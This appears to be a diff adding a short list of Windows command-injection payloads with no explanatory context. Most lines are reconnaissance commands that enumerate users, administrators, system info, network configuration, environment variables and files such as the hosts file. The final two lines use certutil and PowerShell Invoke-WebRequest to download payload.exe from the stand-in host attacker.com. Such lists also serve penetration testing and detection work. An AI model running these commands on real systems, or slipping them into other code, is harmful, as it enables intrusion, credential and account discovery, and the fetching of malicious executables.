@@ -1,0 +1,15 @@
+whoami
+whoami /all
+systeminfo
+ipconfig /all
+net user
+net localgroup administrators
+dir C:\
+type C:\Windows\win.ini
+type C:\Windows\System32\drivers\etc\hosts
+echo %USERNAME%
+set
+ping -n 5 127.0.0.1
+powershell -Command "Get-Process"
+certutil -urlcache -f http://attacker.com/payload.exe payload.exe
+powershell -c "Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile payload.exe"
